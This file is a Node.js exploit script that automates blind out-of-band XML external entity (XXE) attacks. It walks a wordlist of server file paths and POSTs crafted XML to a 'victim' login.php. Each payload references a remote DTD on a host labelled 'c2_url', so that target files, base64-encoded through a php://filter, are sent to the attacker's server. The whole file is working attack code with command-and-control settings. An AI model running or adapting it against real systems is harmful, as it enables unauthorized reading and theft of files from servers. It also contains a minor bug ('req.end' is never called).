var http = require('http');
var fs = require('fs');
var readline = require('readline');
var url = require('url');

/* ********************* */
/* CONFIG section starts */
/* ********************* */
var c2_url = "http://192.168.1.105:8000";
var victim_url = "http://192.168.1.200/login.php";
var proxy_host = null;
var proxy_port = null;
// var proxy_host = "127.0.0.1";
// var proxy_port = 8080;

var wordlist = "/root/Desktop/wordlist";

var full_path = "php://filter/convert.base64-encode/resource=/$$$PAYLOAD_HERE$$$";
// var full_path = "file:///home/ubuntu/$$$PAYLOAD_HERE$$$";

var normal_xml = "<login><username>test</username><password>test</password></login>";
/* ********************* */
/* CONFIG section ends */
/* ********************* */


var rd = readline.createInterface({
    input: fs.createReadStream(wordlist)
});

rd.on('line', function(line) {
//    console.log(line);
    xxe(line);
});


function xxe(path) {
    var file_path = full_path.replace("$$$PAYLOAD_HERE$$$", path);

    var xml_data = 
        "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n" +
        "<!DOCTYPE test [\n" +
        "   <!ENTITY % file SYSTEM \""+file_path+"\">\n" +
        "   <!ENTITY % path \""+path+"\">\n" +
        "   <!ENTITY % c2url \""+c2_url+"\">\n" +
        "   <!ENTITY % dtd SYSTEM \""+c2_url+"/send.dtd\">\n" +
        "%dtd;\n" +
        "]>\n" +
        normal_xml;

    var rurl = url.parse(victim_url, true);

    var rhost = rurl.hostname;
    var rport = rurl.port;
    var rpath = rurl.pathname + rurl.search;

    if (proxy_host != null) {
        rhost = proxy_host;
        rport = proxy_port;
        rpath = victim_url;
    }

    var req_opts = {
        host: rhost,
        port: rport,
        path: rpath,
        method: 'POST',
        headers: {
            'Content-Type': 'text/xml',
//            'X-CSRF-TOKEN': 'token',
            'Content-Length': Buffer.byteLength(xml_data),
            'Host': rurl.hostname
        }
    };

    var req = http.request(req_opts, function(resp) {
        // Continuously update stream with data
        var body = '';
        resp.on('data', function(d) {
            body += d;
        });
        resp.on('end', function() {
            // Data reception is done, do whatever with it!
           console.log(body.length);
        });
    });

    req.write(xml_data);
    req.end;
}
